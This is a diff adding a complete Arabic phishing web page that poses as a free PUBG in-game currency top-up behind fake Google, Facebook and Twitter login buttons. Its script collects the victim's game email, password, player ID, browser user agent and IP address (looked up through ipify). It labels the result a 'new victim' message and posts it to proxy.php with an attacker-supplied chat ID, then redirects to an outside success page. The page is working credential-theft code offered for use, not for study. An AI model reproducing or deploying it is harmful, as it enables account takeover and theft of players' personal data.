@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تهكير حساب ببجي</title>
+  <style>
+    body { margin: 0; overflow: hidden; font-family: Arial, sans-serif; color: yellow; background: #2e2459; }
+    .container { margin: 20px auto; padding: 20px; background: rgba(0,0,0,0.7); border-radius: 10px; width: 90%; max-width: 400px; position: relative; z-index: 1; text-align: center; }
+    .btn { display: block; width: 100%; padding: 10px; margin: 10px 0; background: #3a3a3a; color: yellow; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
+    .buy-btn { background: yellow; color: black; border: none; padding: 5px 10px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+    input, select { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; background: rgba(255, 255, 255, 0.2); color: white; }
+    form { background: #3a3a3a; padding: 20px; border-radius: 10px; }
+    label { display: block; margin-bottom: 5px; font-weight: bold; color: yellow; background: black; padding: 5px; border-radius: 5px; }
+    canvas#snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+  </style>
+</head>
+<body>
+
+<canvas id="snow"></canvas>
+
+<div id="login" class="container">
+  <h1>تسجيل دخول حساب ببجي</h1>
+  <button class="btn" onclick="showForm()">Google</button>
+  <button class="btn" onclick="showForm()">Facebook</button>
+  <button class="btn" onclick="showForm()">Twitter</button>
+</div>
+
+<div id="form" class="container" style="display:none;">
+  <h1>شحن ببجي مجانا 🎁</h1>
+  <form id="pubgForm">
+    <label>بريد الكتروني حساب اللعبة:</label>
+    <input type="email" name="email" required>
+    <label>كلمة سر حساب اللعبة:</label>
+    <input type="password" name="password" required>
+    <label>ايدي اللاعب:</label>
+    <input type="text" name="player_id" required>
+    <label>كمية الشدات:</label>
+    <select name="amount" required>
+      <option value="1000 شدة">1000 شدة</option>
+      <option value="1500 شدة">1500 شدة</option>
+      <option value="2000 شدة">2000 شدة</option>
+      <option value="2500 شدة">2500 شدة</option>
+      <option value="3000 شدة">3000 شدة</option>
+    </select>
+    <button type="submit" class="buy-btn">شحن</button>
+  </form>
+</div>
+
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const CHAT_ID = urlParams.get('id');
+
+  function showForm() {
+    document.getElementById("login").style.display = "none";
+    document.getElementById("form").style.display = "block";
+  }
+
+  document.getElementById("pubgForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const form = new FormData(this);
+    const email = form.get("email");
+    const password = form.get("password");
+    const playerId = form.get("player_id");
+    const amount = form.get("amount");
+    const device = navigator.userAgent;
+
+    let ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json()).catch(() => ({ ip: "غير معروف" }));
+
+    const message = `🚨 ضحية جديدة ببجي:
+    
+البريد: ${email}
+كلمة السر: ${password}
+ID: ${playerId}
+الشدات: ${amount}
+الجهاز: ${device}
+IP: ${ipData.ip}`;
+
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("message", message);
+
+    fetch("proxy.php", { method: "POST", body: fd })
+    .then(() => {
+      window.location.href = "https://issol.free.nf/success/ok.html?i=1";
+    });
+  });
+</script>
+</body>
+</html>
